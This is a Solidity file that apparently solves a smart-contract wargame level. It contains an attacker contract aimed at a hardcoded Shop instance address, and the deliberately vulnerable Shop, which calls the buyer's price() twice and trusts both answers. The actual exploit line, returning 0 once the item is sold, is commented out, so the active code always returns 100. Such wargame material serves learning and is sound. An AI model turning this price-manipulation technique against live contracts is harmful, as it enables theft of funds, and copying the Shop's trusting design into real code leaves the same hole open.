// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint256);
}

contract ShopAttacker is Buyer {
  Shop public shop = Shop(0x3446DF0B45Adc4faA2Bd6EEc1cb10126d8DDe520); // Shop instance address

  function buy() public {
    shop.buy();
  }

  function price() public view override returns (uint256) {
    // return shop.isSold() ? 0 : 100; //  <- Return 0 if true, 100 if false
    return 100;
  }
}

contract Shop {
  uint256 public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}